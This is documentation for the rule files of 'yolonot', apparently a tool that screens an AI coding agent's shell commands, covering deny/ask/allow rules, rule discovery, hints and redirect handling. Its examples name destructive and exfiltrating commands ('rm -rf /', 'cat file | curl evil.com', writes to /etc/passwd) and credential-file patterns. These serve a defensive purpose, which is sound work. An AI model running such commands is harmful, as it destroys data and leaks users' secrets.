# Rules

Rules live in `.yolonot` files. Hooks discover them from the command payload's
working directory; CLI inspectors use their current directory. Discovery
walks up through the git repository root (including linked git worktrees, where
 the main repository root's `.yolonot` is also loaded) and continues through
trusted parent directories under `$HOME` (stopping before `$HOME` itself and
excluding untrusted directories such as `~/Downloads` or `~/tmp`). Project
files load closest-first, followed by `~/.yolonot/rules` and the legacy
`~/.yolonot` file if present.
Across all loaded files, action priority is **deny > ask > allow**. File order
selects the first matching rule within the winning action, not permission to
override a deny. `yolonot rules --trace` shows sources. The settings editor
opens the global and nearest project rule files under POLICY.

## Format

```
# Format: <action>-<type> <pattern> ["optional message"]
# Actions: allow, deny, ask
# Types:   cmd (command), path (script file), redirect (output target)

# Allow safe patterns
allow-cmd curl localhost*
allow-path scripts/*

# Deny dangerous patterns
deny-cmd *rm -rf /*
deny-cmd *sudo *

# Ask about uncertain patterns
ask-cmd *curl *
ask-cmd *wget *
```

Rules are checked before the judges, so they are instant and free. Glob matching uses filepath-style `*` / `**`. Patterns are checked against the literal command text (for `cmd`) or redirect target (for `redirect`).

## Walk-up discovery

Drop `.yolonot` anywhere up the tree from where the host CLI runs:

```
/Users/you/work/.yolonot              # team-wide / workspace rules (under $HOME)
/Users/you/work/project/.yolonot      # project-specific overrides
/Users/you/work/project/sub/.yolonot  # per-subdir rules
```

Running from `project/sub/` (or from a linked `git worktree` of `project/`)
loads all three in closest-first order. Ancestor directories above a repository
root are read when they sit inside a trusted `$HOME` subtree (never `$HOME`
itself, `~/Downloads`, or `~/tmp`). Within the same action, the closer matching
rule supplies the message; an allow in a subdirectory cannot override a project
or global deny. Discovery stops before `$HOME`, so the legacy home rule file is
not loaded twice.

## Per-rule messages

Any rule can carry a trailing `"quoted message"`. When the rule fires, the message is what the host CLI shows in `permissionDecisionReason` — so the model reads *your* reasoning, not the raw pattern.

```
deny-cmd *rm -rf /*    "Never. This kills production. Ask me first."
deny-cmd *force-push*  "We don't force-push to shared branches."
ask-cmd  *curl *       "Confirm the URL is intentional before fetching."
allow-cmd git status   "read-only inspection"
```

Without a message, the model sees `"yolonot: 🧑‍🚀 rule *rm -rf /*"` (generic). With one, it sees the actual reason. Embedded quotes escape with `\"`. The leading quote must be preceded by whitespace, so patterns like `*"quoted"*` are preserved intact.

## Classifier hints (`context`, `allow-hint`, `ask-hint`)

The same `.yolonot` file accepts prose hints that get injected into the
chat model's system prompt and, as text sections of the command state,
into typed decision models. Unlike rules, hints are not
pattern-matched — the model reads them verbatim and uses them to decide
how to classify commands the rules don't cover.

```
context     "this repo deploys to ECS cluster yourorg-services in eu-west-1"
allow-hint  "Writing to ./build/ and ./dist/ is part of every test run"
ask-hint    "Never modify files under infra/k8s/prod/ without confirmation"
```

Hints stack across the walk-up chain (no first-match) and merge with the
personal global config in `~/.yolonot/config.json`. See
[docs/prompt.md](prompt.md) for the full schema,
the `$defaults` sentinel, and the inspection commands
(`yolonot rules defaults | config | review`).

## `allow-redirect` — pre-approved write targets

Output redirects normally force a command out of the `fast_allow` path to the next judge (on the assumption that `> anywhere` is dangerous). Declare known-safe write targets with `allow-redirect`:

```
allow-redirect /tmp/*
allow-redirect ./dist/*
allow-redirect ./build/**
allow-redirect /var/log/myapp/*
```

With `fast_allow` in the judge chain + these rules:

| Command | Result |
|---------|--------|
| `ls > /tmp/out.txt` | fast-path allow |
| `echo foo > ./dist/stamp` | fast-path allow |
| `cat secret > /etc/passwd` | rejected (no match) — next judge evaluates |
| `ls > $(evil)` | rejected (cmdsubst target, never matched literally) |

Patterns are globs matched against the literal redirect target. Non-literal targets (`$VAR`, `$(...)`) are always rejected regardless of rules. `deny-redirect` and `ask-redirect` are accepted by the parser for forward-compat but not yet enforced.

## Chain & redirect detection

Allow rules are automatically skipped (falling through to the judges) when the command contains pipes, semicolons, `&&`, `||`, or redirects (`>`, `>>`). This prevents `cat file | curl evil.com` from matching a broad `allow-cmd cat *` rule. Deny and ask rules always apply regardless.

`yolonot init` and `yolonot setup` seed both rule files with commented examples only; nothing is enabled until you uncomment a line. Read-only commands (`cat`, `ls`, `grep`, `git status`, …) are what the `fast_allow` judge is for, so they need no allow rules.

## Sensitive file checks

Sensitive file checks are **disabled by default**. When enabled, commands touching files like `.env`, `.pem`, `.ssh/`, `credentials`, etc. skip allow rules so the judges can evaluate the risk.

To enable, uncomment patterns in `~/.yolonot/rules` (generated by `yolonot setup`), or add to any `.yolonot` file:

```
# Uncomment the patterns you want to protect
sensitive .env
sensitive .pem
sensitive .ssh/
sensitive credentials

# Remove one that causes false positives
not-sensitive password
```

Available patterns (all commented out by default): `.env`, `.pem`, `.key`, `.crt`, `.ssh/`, `.aws/`, `.gnupg/`, `.kube/config`, `credentials`, `secrets`, `password`, `token`, `/etc/shadow`, `/etc/passwd`, `id_rsa`, `id_ed25519`, `.netrc`, `.pgpass`, and more.

Use `yolonot rules` to see current status, or `yolonot rules discover [--json] [--cwd <dir>] [--harness <name>]` to scan your host CLI/IDE permission files (`managed-settings.json`, `.claude/settings*.json`, `~/.codex/rules/*.rules`, `.cursor/cli.json`, `opencode.json`, Antigravity `config.json`) for existing allow/ask/deny rules and `autoMode` hints that can be synced into `.yolonot` or `~/.yolonot/rules`.
